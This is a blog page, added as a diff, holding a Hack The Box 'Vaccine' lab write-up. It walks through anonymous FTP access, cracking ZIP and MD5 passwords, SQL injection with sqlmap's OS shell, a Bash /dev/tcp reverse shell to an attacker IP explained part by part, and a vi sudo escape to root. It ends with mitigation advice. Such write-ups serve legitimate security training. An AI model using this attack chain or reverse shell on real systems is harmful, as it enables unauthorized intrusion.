@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>I hack things sometimes</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://marcellbarsony.github.io/style.css">
+
+    <link rel="stylesheet" href="https://marcellbarsony.github.io/color/blue.css">
+    <link rel="stylesheet" href="https://marcellbarsony.github.io/font-hack-subset.css">
+
+    <meta name="description" content="">
+
+    <meta property="og:description" content="">
+    <meta property="og:title" content="I hack things sometimes">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://marcellbarsony.github.io/hackthebox-vaccine/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:title" content="I hack things sometimes">
+    <meta property="twitter:domain" content="marcellbarsony.github.io&#x2F;">
+    <meta property="twitter:url" content="https://marcellbarsony.github.io/hackthebox-vaccine/">
+
+    </head>
+
+<body class="">
+<div class="container">
+    <!-- HEADER -->
+    
+    <header class="header">
+        <!-- LOGO -->
+        <!-- <div class="header__inner"> -->
+        <!--     <div class="header__logo"> -->
+        <!-- -->
+        <!--              -->
+        <!--         -->
+        <!--         <a href="https://marcellbarsony.github.io/" style="text-decoration: none;"> -->
+        <!--             <div class="logo"> -->
+        <!--                -->
+        <!-- -->
+        <!--                     | | | | | | | | | | -->
+        <!--                 -->
+        <!--                  -->
+        <!--             </div> -->
+        <!--         </a> -->
+        <!--     </div> -->
+        <!-- </div> -->
+
+        
+        
+                <nav class="menu">
+            <ul class="menu__inner">
+                <li class="active"><a href="https://marcellbarsony.github.io/">posts</a></li>
+            
+                <li><a href="https://marcellbarsony.github.io//tags">tags</a></li>
+            
+                <li><a href="https://marcellbarsony.github.io//archive">archive</a></li>
+            
+                <li><a href="https://marcellbarsony.github.io//whoami">whoami</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://marcellbarsony.github.io/hackthebox-vaccine/">Hack The Box - Vaccine</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2025-05-30
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                ::
+                <a class="post-tag" href="https://marcellbarsony.github.io/tags/hackthebox/">hackthebox</a>&nbsp;::
+            
+                <a class="post-tag" href="https://marcellbarsony.github.io/tags/starting-point/">starting point</a>&nbsp;::
+            
+                <a class="post-tag" href="https://marcellbarsony.github.io/tags/ftp/">ftp</a>&nbsp;::
+            
+                <a class="post-tag" href="https://marcellbarsony.github.io/tags/sql/">sql</a>&nbsp;::
+            
+                <a class="post-tag" href="https://marcellbarsony.github.io/tags/sql-injection/">sql injection</a>&nbsp;::
+            
+                <a class="post-tag" href="https://marcellbarsony.github.io/tags/reverse-shell/">reverse shell</a>&nbsp;::
+            
+                <a class="post-tag" href="https://marcellbarsony.github.io/tags/privesc/">privesc</a>&nbsp;::
+            
+        </span>
+    
+
+        <div class="post-content">
+            <p><a href="https://www.hackthebox.com/achievement/machine/447801/289"><img src="/pictures/articles/htb/vaccine/00-cover.png" alt="TODO" /></a></p>
+<p><strong>Vaccine</strong> is a Linux machine built to demonstrate the importance
+of enumeration, and the dangers of chaining multiple vulnerabilities together
+such as SQL injection, password hash cracking, anonymous guest access
+and session cookie stealing.</p>
+<span id="continue-reading"></span><h1 id="enumeration">Enumeration</h1>
+<!-- Enumeration {{{-->
+<p>The <a href="https://nmap.org/">nmap</a> scan reveals the target machine has port 21
+(<a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol">FTP</a>),
+port 22 (<a href="https://en.wikipedia.org/wiki/Secure_Shell">SSH</a>), and
+port 80 (<a href="https://en.wikipedia.org/wiki/HTTP">HTTP</a>) open.</p>
+<p><img src="/pictures/articles/htb/vaccine/01-nmap.png" alt="a" /></p>
+<ul>
+<li><code>-sC</code>: Script scan</li>
+<li><code>-sV</code>: Version detection</li>
+</ul>
+<p>The webpage only presents a single login page which, for now, cannot be
+bypassed.</p>
+<p><img src="/pictures/articles/htb/vaccine/02-login.png" alt="a" /></p>
+<p>There's also an FTP service running with the target machine that is allowing
+anonymous login. The username should be <code>anonymous</code> and the corresponding
+password is arbitrary.</p>
+<p><img src="/pictures/articles/htb/vaccine/03-ftp-connect.png" alt="a" /></p>
+<p>After logging in, the <code>dir</code> command can be used to list the available files.</p>
+<p>There's only one file on the share, named <code>backup.zip</code>, which can be retrieved
+using the <code>get backup.zip</code> command.</p>
+<p>To exit the FTP session, issue the <code>exit</code> command.</p>
+<p><img src="/pictures/articles/htb/vaccine/04-ftp-get.png" alt="a" /></p>
+<p><code>backup.zip</code> then needs to be extracted however, it is password-protected.</p>
+<p><img src="/pictures/articles/htb/vaccine/05-unzip.png" alt="a" /></p>
+<p>To crack the password, its hash needs to be extracted first from the encrypted
+ZIP archive using <code>zip2john</code>.</p>
+<p><img src="/pictures/articles/htb/vaccine/06-zip2john.png" alt="a" /></p>
+<p>Then the extracted hash can be checked against the famous <code>rockyou</code> wordlist
+using <a href="https://www.openwall.com/john/">John the Ripper</a>.</p>
+<p><code>john</code> shows that the password to unlock the ZIP is <code>741852963</code>.</p>
+<p><img src="/pictures/articles/htb/vaccine/07-john-hashcrack.png" alt="a" /></p>
+<p>The ZIP contains 2 files that can be investigated further.</p>
+<p><img src="/pictures/articles/htb/vaccine/08-unzip.png" alt="a" /></p>
+<p><a href="https://en.wikipedia.org/wiki/Grep">grep</a>ping <code>index.php</code> for <code>passw</code> reveals
+a password hash stored for the <code>admin</code> user.</p>
+<p>The found hash can be stored in a file for later use.</p>
+<p><img src="/pictures/articles/htb/vaccine/09-pass-hash.png" alt="a" /></p>
+<p><a href="https://psypanda.github.io/hashID/">hashID</a> confirms that it is indeed most
+likely an <a href="https://en.wikipedia.org/wiki/MD5">MD5</a> hash.</p>
+<p><img src="/pictures/articles/htb/vaccine/10-hashid.png" alt="a" /></p>
+<p>This hash can then be checked against the <code>rockyou</code> wordlist using <code>hashcat</code>.</p>
+<p><img src="/pictures/articles/htb/vaccine/11-hashcat.png" alt="a" /></p>
+<ul>
+<li><code>-a 0</code>: Dictionary attack mode</li>
+<li><code>-m 0</code>: MD5 hash type</li>
+</ul>
+<p><code>hashcat</code> has cracked the hash and found the password <code>qwerty789</code>.</p>
+<p><img src="/pictures/articles/htb/vaccine/12-hashcat-result.png" alt="a" /></p>
+<p>It is now possible to log in to the website and enumerate its dashboard.</p>
+<p><img src="/pictures/articles/htb/vaccine/13-login.png" alt="a" /></p>
+<!-- }}} -->
+<h1 id="foothold">Foothold</h1>
+<!-- Foothold {{{-->
+<p>Upon running a search query, it reveals that the dashboard may actually be
+connected with a backend database.</p>
+<p><img src="/pictures/articles/htb/vaccine/14-test-query.png" alt="a" /></p>
+<p>Intercepting the search query request with Burp Suite shows that there is a PHP
+Session ID (<code>PHPSESSID</code>) being passed to the database in a form of a cookie.</p>
+<p><img src="/pictures/articles/htb/vaccine/15-cookie.png" alt="a" /></p>
+<p>The search query can be investigated with
+<a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> if it is SQL injectable.</p>
+<p><img src="/pictures/articles/htb/vaccine/16-sqlmap.png" alt="a" /></p>
+<ul>
+<li><code>u</code>: Target URL</li>
+<li><code>--cookie</code>: HTTP header cookie value</li>
+</ul>
+<p><code>sqlmap</code> in its output displays multiple possible payloads to perform an
+SQL injection.</p>
+<p>To exploit the vulnerability, <code>sqlmap</code> should be called again but this time with
+the additional <code>--os-shell</code> option to conclude in a shell.</p>
+<p><img src="/pictures/articles/htb/vaccine/17-sqlmap-res.png" alt="a" /></p>
+<p>The spawned <code>os-shell</code> is not so stable so it needs an additional payload
+to make it work better.</p>
+<p>To receive this incoming connection, a <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>
+should be set up listening an arbitrary port (e.g. <code>1234</code>).</p>
+<p><img src="/pictures/articles/htb/vaccine/18-netcat.png" alt="a" /></p>
+<p>The following Bash one-liner will initiate a connection from target back to the
+attacker machine.</p>
+<p><img src="/pictures/articles/htb/vaccine/19-payload.png" alt="a" /></p>
+<ul>
+<li><code>bash</code>: Invoke a Bash shell</li>
+<li><code>-c</code>: Execute the command that follows</li>
+<li><code>bash -i</code>: Invoke another Bash shell instance</li>
+<li><code>&gt;&amp;</code>: Redirect <code>stdout</code> and <code>stderr</code> to the specified location</li>
+<li><code>/dev/tcp/10.10.15.127/1234</code>: Initiate a TCP connection to the specified
+address</li>
+<li><code>0&gt;&amp;1</code>: Redirect <code>stdin</code> to <code>stdout</code></li>
+</ul>
+<p>The <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>listener has successfully
+received the connection resulting in a reverse shell.</p>
+<p><img src="/pictures/articles/htb/vaccine/20-reverse-shell.png" alt="a" /></p>
+<p>This shell isn't really stable either, it is disconnecting randomly, but it can
+be utilized to look around on the system and retrieve the user flag.</p>
+<p><img src="/pictures/articles/htb/vaccine/21-user-flag.png" alt="a" /></p>
+<!-- }}} -->
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<!-- Privilege escalation {{{-->
+<p>While exploring the web server's dedicated directories,
+a password stored in clear text was discovered in a PHP file.</p>
+<p><img src="/pictures/articles/htb/vaccine/22-user-password.png" alt="a" /></p>
+<p><code>sudo -l</code> shows that the current <code>postgres</code> user can launch <code>/bin/vi</code> as sudo to
+edit a designated configuration file (<code>pg_hba.conf</code>).</p>
+<p><img src="/pictures/articles/htb/vaccine/23-sudo-l.png" alt="a" /></p>
+<p>According to <a href="https://gtfobins.github.io/gtfobins/vi/#sudo">GTFOBins</a>
+there are multiple ways to break out from restricted environments by spawning an
+interactive system shell.</p>
+<p>One way is to open the configuration file with <code>vi</code> as <code>sudo</code>.</p>
+<p><img src="/pictures/articles/htb/vaccine/24-vi-open.png" alt="a" /></p>
+<p>Set the shell to <code>/bin/sh</code>.</p>
+<p><img src="/pictures/articles/htb/vaccine/25-vi.png" alt="a" /></p>
+<p>And then issue the <code>shell</code> command.</p>
+<p><img src="/pictures/articles/htb/vaccine/26-vi.png" alt="a" /></p>
+<p>After executing the commands, a <code>root</code> shell is spawned and the <code>root</code> flag can
+be retrieved from the <code>/root</code> directory.</p>
+<p><img src="/pictures/articles/htb/vaccine/27-root-flag.png" alt="a" /></p>
+<p>By achieving root privileges, the machine is
+<a href="https://www.hackthebox.com/achievement/machine/447801/289">pwned</a>.</p>
+<!-- }}} -->
+<h1 id="mitigation">Mitigation</h1>
+<!-- Mitigation {{{-->
+<ol>
+<li>
+<p>Secure FTP Service</p>
+<ul>
+<li>Disable anonymous logins and require authentication</li>
+<li>Replace FTP with more secure protocols such as STFP</li>
+</ul>
+</li>
+<li>
+<p>Web Application Security</p>
+<ul>
+<li>Implement multi factor authentication mechanisms</li>
+</ul>
+</li>
+<li>
+<p>SQL injection</p>
+<ul>
+<li>Validate and sanitize all user inputs</li>
+<li>Use prepared statements and parameterized queries to separate SQL code
+from data</li>
+</ul>
+</li>
+<li>
+<p>Reverse Shell Prevention</p>
+<ul>
+<li>Monitor and restrict outbound network traffic for patterns indicating
+reverse shell attacks</li>
+</ul>
+</li>
+<li>
+<p>Sudo privileges</p>
+<ul>
+<li>Implement the principle of least privilege when assigning sudo rights</li>
+</ul>
+</li>
+<li>
+<p>Restrict configuration files</p>
+<ul>
+<li>Ensure configuration files are accessible only for authorized users</li>
+</ul>
+</li>
+<li>
+<p>Secure Shell Access</p>
+<ul>
+<li>Restrict shell commands that can be executed</li>
+<li>Monitor shell activity for suspicious behaviour</li>
+</ul>
+</li>
+</ol>
+<!-- }}} -->
+
+        </div>
+
+        
+        <div class="pagination">
+            <div class="pagination__title">
+                <hr />
+            </div>
+            <div class="pagination__buttons">
+                    <span class="button previous">
+                        <a href="https://marcellbarsony.github.io/hackthebox-oopsie/">
+                            <span class="button__icon">‹</span>&nbsp;
+                            <span class="button__text">Hack The Box - Oopsie</span>
+                        </a>
+                    </span>
+                
+                
+                    <span class="button next">
+                        <a href="https://marcellbarsony.github.io/hackthebox-unified/">
+                            <span class="button__text">HackTheBox - Unified</span>&nbsp;
+                    <span class="button__icon">❯</span>
+                        </a>
+                    </span>
+                </div>
+        </div>
+    
+    </div>
+
+    </div>
+
+    <!-- FOOTER -->
+    <!--  -->
+    <!-- <footer class="footer"> -->
+    <!--     <div class="footer__inner"> -->
+    <!-- -->
+    <!--             <div class="copyright copyright--user">My custom&nbsp;<b>copyright</b></div> -->
+    <!--         -->
+    <!--     </div> -->
+    <!-- </footer> -->
+    <!--  -->
+
+</div>
+</body>
+
+</html>
